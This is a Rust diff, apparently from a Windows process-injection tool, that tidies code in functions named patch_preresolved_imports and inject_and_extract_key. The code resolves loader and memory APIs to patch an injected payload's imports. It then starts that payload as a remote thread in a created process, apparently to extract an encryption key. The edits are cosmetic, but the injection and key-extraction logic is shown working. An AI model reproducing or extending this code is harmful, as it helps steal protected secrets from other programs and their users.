@@ -109,18 +109,19 @@ fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>> {
   use windows::core::PCSTR;
   use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-  let kernel32_name = b"kernel32.dll\0";
-  let ntdll_name = b"ntdll.dll\0";
+  let kernel32 = unsafe { GetModuleHandleA(PCSTR(c"kernel32.dll".as_ptr().cast())) }?;
+  let ntdll = unsafe { GetModuleHandleA(PCSTR(c"ntdll.dll".as_ptr().cast())) }?;
 
-  let kernel32 = unsafe { GetModuleHandleA(PCSTR(kernel32_name.as_ptr())) }?;
-  let ntdll = unsafe { GetModuleHandleA(PCSTR(ntdll_name.as_ptr())) }?;
-
-  let p_load_library_a = unsafe { GetProcAddress(kernel32, PCSTR(b"LoadLibraryA\0".as_ptr())) };
-  let p_get_proc_address = unsafe { GetProcAddress(kernel32, PCSTR(b"GetProcAddress\0".as_ptr())) };
-  let p_virtual_alloc = unsafe { GetProcAddress(kernel32, PCSTR(b"VirtualAlloc\0".as_ptr())) };
-  let p_virtual_protect = unsafe { GetProcAddress(kernel32, PCSTR(b"VirtualProtect\0".as_ptr())) };
+  let p_load_library_a =
+    unsafe { GetProcAddress(kernel32, PCSTR(c"LoadLibraryA".as_ptr().cast())) };
+  let p_get_proc_address =
+    unsafe { GetProcAddress(kernel32, PCSTR(c"GetProcAddress".as_ptr().cast())) };
+  let p_virtual_alloc =
+    unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualAlloc".as_ptr().cast())) };
+  let p_virtual_protect =
+    unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualProtect".as_ptr().cast())) };
   let p_nt_flush_ic =
-    unsafe { GetProcAddress(ntdll, PCSTR(b"NtFlushInstructionCache\0".as_ptr())) };
+    unsafe { GetProcAddress(ntdll, PCSTR(c"NtFlushInstructionCache".as_ptr().cast())) };
 
   let load_library_a =
     p_load_library_a.ok_or_else(|| anyhow!("failed to resolve LoadLibraryA"))? as usize;
@@ -204,8 +205,10 @@ pub fn inject_and_extract_key(
     .chain(std::iter::once(0))
     .collect();
 
-  let mut si = STARTUPINFOW::default();
-  si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+  let si = STARTUPINFOW {
+    cb: std::mem::size_of::<STARTUPINFOW>() as u32,
+    ..Default::default()
+  };
   let mut pi = PROCESS_INFORMATION::default();
 
   let created = unsafe {
@@ -279,7 +282,10 @@ pub fn inject_and_extract_key(
       pi.hProcess,
       None,
       0,
-      Some(std::mem::transmute(entry_addr)),
+      Some(std::mem::transmute::<
+        *const (),
+        unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+      >(entry_addr)),
       None,
       0,
       Some(&mut thread_id),
